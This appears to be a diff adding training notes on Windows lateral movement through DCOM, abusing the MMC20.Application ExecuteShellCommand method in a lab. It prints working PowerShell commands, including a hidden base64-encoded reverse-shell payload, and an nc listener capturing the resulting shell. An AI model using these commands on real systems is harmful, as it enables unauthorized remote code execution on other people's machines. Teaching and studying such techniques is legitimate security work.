@@ -1,1 +1,52 @@
+DCOM
+In this section, we will inspect a fairly recent lateral movement technique that exploits the Distributed Component Object Model (DCOM) and learn how it can be abused for lateral movement.
+The Microsoft Component Object Model (COM)3is a system for creating software components that interact with each other. 
+While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.
+Both COM and DCOM are very old technologies dating back to the very first editions of Windows. 
+Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.
+Cyberason documented a collection of various DCOM lateral movement techniques, including one discovered by Matt Nelson,6 which we are covering in this section.
+The discovered DCOM lateral movement technique is based on the Microsoft Management Console (MMC) COM application that is employed for scripted automation of Windows systems.
 
+The MMC Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the Document.ActiveView property. 
+As its name suggests, this method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.
+We are going to demonstrate this lateral movement attack as the jen user logged in from the already compromised Windows 11 CLIENT74 host.
+From an elevated PowerShell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP of FILES04 as the second argument of the GetTypeFromProgID method.
+
+Remotely Instantiating the MMC Application object
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.212.x"))
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.x"))
+
+Once the application object is saved into the $dcom variable, we can pass the required argument to the application via the ExecuteShellCommand method. 
+The method accepts four parameters: Command, Directory, Parameters, and WindowState. 
+We're only interested in the first and third parameters, which will be populated with cmd and /c calc, respectively.
+
+Executing a command on the remote DCOM object
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+
+Once we execute these two PowerShell lines from target, we should have spawned an instance of the calculator app.
+Because it's within Session 0, we can verify the calculator app is running with tasklist and filtering out the output with findstr.
+
+Veriyfing that calculator is running on FILES04
+C:\Users\Administrator>tasklist | findstr "calc"
+win32calc.exe                 4764 Services                   0     12,132 K
+
+We can now improve our craft by extending this attack to a full reverse shell similar to what we did with WMI and WinRM 
+
+Having generated the base64 encoded reverse shell with our Python script, we can replace our DCOM payload with it.
+
+Adding a reverse-shell as a DCOM payload on CLIENT74
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+
+     
+Switching to our Kali machine, we can verify any incoming connections on the listener that we simultaneously set up.
+
+kali@kali:~$ nc -lnvp 443
+listening on [any] 443 ...
+connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 50778
+
+PS C:\Windows\system32> whoami
+corp\mute
+
+Obtaining a reverse-shell through DCOM lateral movement
+We gained a foothold on an additional internal box by abusing the DCOM MMC application.
